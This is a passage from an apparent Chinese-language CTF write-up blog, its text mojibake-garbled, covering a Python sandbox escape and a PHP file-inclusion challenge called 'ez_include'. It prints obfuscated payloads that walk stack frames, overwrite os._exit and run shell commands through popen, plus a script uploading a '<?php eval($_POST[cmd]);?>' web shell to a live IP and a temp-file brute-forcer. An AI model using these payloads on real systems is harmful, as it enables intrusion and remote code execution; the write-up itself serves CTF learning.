class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œé€šè¿‡äº† <code>__builtins__</code> ä¸­çš„ <code>setattr</code>  ä¿®æ”¹äº† <code>os</code>  ä¸­çš„ <code>_exit</code>  ä¸º <code>print</code> ï¼Œé‚£ä¹ˆå°±ç®—è¢«é’©å­æ£€æµ‹åˆ°äº†ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒè¢«ç›´æ¥é€€å‡ºäº†ï¼Œä¹‹åå°±æ˜¯ç›´æ¥ RCE äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="comment">#root</span></span><br></pre></td></tr></table></figure><p>â€‹å› ä¸ºä¸èƒ½ä½¿ç”¨ <code>read()</code> ï¼ˆåœ¨å…³é”®è¯ä¸Šè¢«ç¦ç”¨äº†ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œåªæœ‰é€šè¿‡è¿™ç§æ–¹å¼è¿›è¡Œç»•è¿‡äº†ï¼Œé€šè¿‡ <code>getattr</code>  è·å– <code>popen</code>  æ‰§è¡Œè¿‡åçš„å¯¹è±¡ä¸­çš„ <code>_proc</code>  ä¹‹åç”¨ <code>stdout</code>  è¿›è¡Œè¾“å‡º</p><p>â€‹å…ˆè´´ä¸€ä¸ª payloadï¼Œæœ€å payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±å¯¹è¿™ä¸ª payload å°±è¡Œä¸‹è®²è§£å°±è¡Œäº†ï¼Œå°±ä¸ä¸€æ­¥æ­¥è¿›è¡Œè°ƒè¯•äº†ï¼š</p><p>â€‹é¦–å…ˆï¼Œä¸‰ä¸ª waf å‡½æ•°é‡Œï¼Œç¬¬äºŒä¸ª waf ä½œç”¨ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯ä¼šå¯¼è‡´ <code>#é”™è¯¯: æ‰§è¡Œé”™è¯¯: Disallowed global access: q</code> ï¼Œä¸è¿‡åƒä¹‹åé‚£æ ·å°±ä¸ä¼šå‡ºç°è¿™ä¸ªæŠ¥é”™ã€‚ç¬¬ä¸€ä¸ªä¸»è¦æ˜¯æ¨æ‰äº†å¸¸è§çš„å­—æ®µï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯æ²™ç®±çš„æ ¸å¿ƒç‚¹ï¼Œè™½ç„¶çœ‹ä¸Šå»ç¬¬ä¸‰ä¸ª waf é˜²çš„å¾ˆæ­»ï¼Œä½†æ˜¯ç”¨å¤„ä¸å¤§ï¼Œå› ä¸ºæ˜¯ç”¨çš„ <code>os._exit()</code>  ç›´æ¥ exit æ‰äº†ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ç»™ os é‡Œçš„è¿™ä¸ªæ–¹æ³•ç»™æ¨æ‰å°±è¡Œäº†ï¼Œä¸éœ€è¦åœ¨æ„ï¼Œæ‰€ä»¥è¿™é‡Œçš„ payload å°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;cat /aaaFffLllA44Ggg&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè´´ä¸€ä¸‹ k13in å¤§ä½¬çš„ pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    x=(x.gi_frame.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>]); <span class="keyword">return</span> [*x][<span class="number">0</span>]</span><br><span class="line">fr=f(); k=<span class="string">&quot;\x6f\x73&quot;</span>.encode().decode(<span class="string">&quot;unicode_escape&quot;</span>); p=fr</span><br><span class="line"><span class="keyword">while</span> p:</span><br><span class="line">    g=p.f_globals</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> g:</span><br><span class="line">        o=g[k]</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/&quot;</span>)])</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/app&quot;</span>)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p=p.f_back</span><br></pre></td></tr></table></figure><h2 id="ez_includeå¤ç°"><a class="markdownIt-Anchor" href="#ez_includeå¤ç°">#</a> <strong>ez_include</strong>ï¼ˆå¤ç°ï¼‰</h2><blockquote><p>ä¸å¤ªä¸€æ ·çš„æ–‡ä»¶åŒ…å«</p></blockquote><p>â€‹è´´ä¸ªæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span> === <span class="string">&#x27;tmp&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$tmpDir</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$tmpDir</span>) || !<span class="title function_ invoke__">is_readable</span>(<span class="variable">$tmpDir</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;/tmpç›®å½•ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$tmpDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$files</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æ— æ³•æ‰«æ/tmpç›®å½•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpFiles</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;php&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$phpFiles</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$phpFiles</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¼ å…¥æœ‰æ•ˆçš„fileå‚æ•°&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filterPrefix</span> = <span class="string">&#x27;php://filter/string.strip_tags/resource=&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="variable">$filterPrefix</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$resourcePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$filterPrefix</span>));</span><br><span class="line">        <span class="variable">$resourceRealPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$resourcePath</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resourceRealPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$resourceRealPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span> || <span class="variable">$resourceRealPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$realPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$realPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAllowedFile</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fileå‚æ•°ä¸åˆæ³•&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$includeResult</span> = @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$includeResult</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;æ— æ³•åŒ…å«æ–‡ä»¶&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¯·ä¼ å…¥æœ‰æ•ˆçš„fileå‚æ•°</span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ <code>$filterPrefix = 'php://filter/string.strip_tags/resource=';</code> ï¼Œä¾ç¨€è®°å¾—<strong> BUUOJ-[NPUCTF2020] ezinclude 1</strong> è¿™ä¸ªé¢˜é‡Œæœ‰ä¸€ä¸ªè¿™ä¸ªä¼ªåè®®ï¼Œæœ‰ä¸ªç‰¹æ€§ï¼š</p><blockquote><p>åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå¦‚æœå‡ºç°  <code>Segment Fault</code>  ï¼Œé‚£ä¹ˆä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚è¿™é‡Œçš„ä¸Šä¼ æ–‡ä»¶éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œä¸€èˆ¬è®¤ä¸ºï¼Œä¸Šä¼ æ–‡ä»¶éœ€è¦å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œä½†å®é™…ä¸Šï¼Œæ— è®ºæ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œåªè¦ HTTP è¯·æ±‚ä¸­å­˜åœ¨æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šè¢«ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œå½“å‰ HTTP è¯·æ±‚å¤„ç†å®Œæˆåï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ä½¿  <code>php</code>  é™·å…¥æ­»å¾ªç¯ç›´ï¼Œäº§ç”Ÿ  <code>Segment Fault</code>  çš„æ–¹æ³•ï¼šï¼ˆå…·ä½“åŸç†æœªæ‰¾åˆ°ï¼Œå¦‚æœæœ‰å¤§ä½¬æ¸…æ¥šï¼Œè¯·å‘ŠçŸ¥ï¼Œæ„Ÿè°¢ã€‚ï¼‰</p><ul><li>ä½¿ç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/string.strip_tags/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/convert.quoted-printable-encode/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è¦æ±‚</li><li><code>file</code></li><li><code>file_get_contents</code></li><li><code>readfile</code></li></ul></blockquote><p>â€‹æ‰€ä»¥ç›´æ¥ PHP LFI åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼‹string.strip_tags è¿‡æ»¤å™¨å¯¼è‡´å‡ºç° php segment fault</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://8.153.93.57:30372/?file=php://filter/string.strip_tags/resource=index.php&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åç”¨ <code>?file=tmp</code> ï¼Œè¿™é‡ŒåŠŸèƒ½æ˜¯æ‰«æä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼Œè¾“å‡º <code>DAyj</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®è¿™é‡Œï¼Œå¯ä»¥çŸ¥é“ï¼Œå½“è¾“å‡ºé•¿åº¦é«˜äº 4 çš„æ—¶å€™è¾“å‡ºåå››ä½ï¼Œé‚£ä¹ˆï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸¤ä½æ˜¯æœªçŸ¥çš„ <code>php??DAyj</code> ï¼Œé‚£ä¹ˆå°±å¾—çˆ†ç ´</p><p>â€‹æœ€åçˆ†ç ´å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡URLçš„åŸºç¡€éƒ¨åˆ†ï¼ˆ??ä¸ºå¾…çˆ†ç ´ä½ç½®ï¼‰</span></span><br><span class="line">base_url = <span class="string">&quot;http://8.153.93.57:30372/?file=/tmp/php&#123;&#125;&#123;&#125;DAyj&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´å­—ç¬¦é›†ï¼šæ•°å­— + å¤§å†™å­—æ¯ + å°å†™å­—æ¯</span></span><br><span class="line">chars = string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯·æ±‚å¤´ï¼ˆæ ¹æ®æä¾›çš„æ•°æ®åŒ…æ„é€ ï¼Œä¿®æ­£æ¢è¡Œè¯­æ³•é—®é¢˜ï¼‰</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span 